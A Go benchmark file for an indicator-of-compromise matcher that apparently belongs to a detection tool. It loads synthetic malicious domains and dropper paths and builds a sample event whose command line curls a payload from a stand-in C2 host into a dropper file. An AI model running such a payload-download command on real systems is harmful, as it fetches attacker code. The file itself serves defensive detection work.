package ioc

import (
	"fmt"
	"testing"

	"github.com/conor-sometimes/banken/internal/event"
)

// BenchmarkIOCMatch measures the per-event match cost against indicator sets of
// very different sizes. The point of the fix is that the cost of one Match does
// not grow with the feed size: domains resolve by a label-suffix map lookup and
// filenames by one Aho-Corasick pass, neither a scan of the feed. So the 1k and
// 100k numbers should be close -- the per-indicator compile cost is paid once,
// at load, and is excluded here by a warm-up Match before the timer starts.
func BenchmarkIOCMatch(b *testing.B) {
	for _, n := range []int{1_000, 100_000} {
		b.Run(fmt.Sprintf("indicators=%d", n), func(b *testing.B) {
			s := NewSet()
			for i := 0; i < n; i++ {
				s.Add(fmt.Sprintf("bad%d.evil-%d.example", i, i), "bench")
				s.Add(fmt.Sprintf("/opt/mal/dropper-%d.bin", i), "bench")
			}
			// One domain hit (a subdomain of a loaded feed domain) and one
			// filename substring hit, both near the middle of the feed, plus
			// benign text so the fields are realistic.
			mid := n / 2
			ev := event.Event{
				CommandLine: fmt.Sprintf("curl https://c2.bad%d.evil-%d.example/x -o /opt/mal/dropper-%d.bin", mid, mid, mid),
				Image:       "/usr/bin/curl",
			}

			s.Match(ev) // warm the lazy compile out of the timed loop
			b.ReportAllocs()
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				_ = s.Match(ev)
			}
		})
	}
}
